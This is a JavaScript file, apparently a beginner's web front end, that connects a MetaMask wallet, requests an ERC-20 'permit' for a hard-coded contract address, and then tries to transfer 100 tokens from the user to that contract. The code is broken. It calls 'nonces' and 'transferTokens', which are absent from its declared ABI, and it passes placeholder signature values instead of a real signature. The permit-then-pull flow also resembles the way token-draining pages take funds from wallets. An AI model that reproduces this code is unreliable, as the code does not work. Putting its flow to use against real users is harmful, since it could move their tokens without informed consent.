document.addEventListener("DOMContentLoaded", function () {
    // 全局变量
    let provider;
    let signer;
    let contract;
    let userAddress;

    // 合约地址和 ABI （需要替换为你的实际合约地址和 ABI）
    const contractAddress = "0x2E9d30761DB97706C536A112B9466433032b28e3";
    const contractABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "balanceOf",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			},
			{
				"internalType": "uint256",
				"name": "deadline",
				"type": "uint256"
			},
			{
				"internalType": "uint8",
				"name": "v",
				"type": "uint8"
			},
			{
				"internalType": "bytes32",
				"name": "r",
				"type": "bytes32"
			},
			{
				"internalType": "bytes32",
				"name": "s",
				"type": "bytes32"
			}
		],
		"name": "permit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "sender",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "recipient",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];

    // 连接钱包按钮点击事件
    document.getElementById('connectWalletBtn').addEventListener('click', async function () {
        if (typeof window.ethereum !== 'undefined') {
            try {
                // 请求连接钱包
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                console.log("钱包已连接:", userAddress);
            } catch (error) {
                console.error("钱包连接失败:", error);
            }
        } else {
            alert("请安装 MetaMask 或其他钱包插件！");
        }
    });

    // 签名授权按钮点击事件
    document.getElementById('signPermitBtn').addEventListener('click', async function () {
        if (!signer) {
            alert("请先连接钱包！");
            return;
        }
        try {
            contract = new ethers.Contract(contractAddress, contractABI, signer);
            const nonce = await contract.nonces(userAddress);
            const deadline = Math.floor(Date.now() / 1000) + 60 * 60; // 一小时后过期

            // 这里使用一个简单的例子，你可以根据你的合约细节调整
            const permit = await contract.permit(
                userAddress,
                contractAddress,
                ethers.utils.parseUnits("100", 18), // 允许转移的代币数量
                deadline,
                {
                    v: 27, // 签名的 v 值（通过实际的签名生成）
                    r: "0x...", // r 值
                    s: "0x..." // s 值
                }
            );
            console.log("签名授权成功:", permit);
        } catch (error) {
            console.error("签名授权失败:", error);
        }
    });

    // 转移代币按钮点击事件
    document.getElementById('transferTokensBtn').addEventListener('click', async function () {
        if (!signer) {
            alert("请先连接钱包！");
            return;
        }
        try {
            contract = new ethers.Contract(contractAddress, contractABI, signer);
            const tx = await contract.transferTokens(userAddress, contractAddress, ethers.utils.parseUnits("100", 18));
            console.log("转移代币交易已发送:", tx.hash);
        } catch (error) {
            console.error("代币转移失败:", error);
        }
    });
});
